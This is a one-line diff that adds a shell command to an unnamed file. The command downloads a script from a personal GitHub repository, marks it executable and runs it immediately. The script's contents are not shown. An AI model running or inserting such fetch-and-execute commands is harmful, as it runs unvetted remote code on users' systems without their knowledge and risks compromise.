@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
